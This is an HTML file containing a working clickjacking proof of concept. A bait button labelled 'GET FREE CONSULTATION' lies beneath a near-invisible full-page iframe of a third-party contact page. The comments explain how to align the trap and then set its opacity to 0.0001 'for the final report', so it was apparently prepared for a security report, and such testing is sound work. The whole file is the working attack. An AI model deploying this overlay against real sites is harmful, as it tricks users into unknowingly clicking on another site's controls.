<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: rgba(255, 255, 255, 0.1);
            margin: 0;
            padding-top: 100px;
        }

        /* 1. The Fake Button (The Bait) */
        .fake-button {
            position: absolute;
            top: 250px; /* Adjust this to align exactly under the target button */
            left: 50%;
            transform: translateX(-50%);
            padding: 20px 40px;
            background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);
            color: white;
            font-size: 24px;
            font-weight: bold;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            z-index: 1; /* Stays underneath the iframe */
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        .fake-button:hover {
            background: linear-gradient(135deg, #218838 0%, #155724 100%);
        }

        /* 2. The Target Application (The Trap) */
        .target-iframe {
            position: absolute;
            top: 0; 
            left: 0;
            width: 100vw;
            height: 100vh;
            
            /* CRITICAL: Set to 0.5 for testing alignment. 
               Set to 0.0001 for the final report to make it invisible but clickable. */
            opacity: 0.0001; 
            
            z-index: 2; /* Sits directly ON TOP of the fake button */
            border: none;
        }
    </style>
</head>
<body>

    <button class="fake-button">GET FREE CONSULTATION</button>

    <iframe class="target-iframe" src="https://tavron.net/contact.html"></iframe>

</body>
</html>
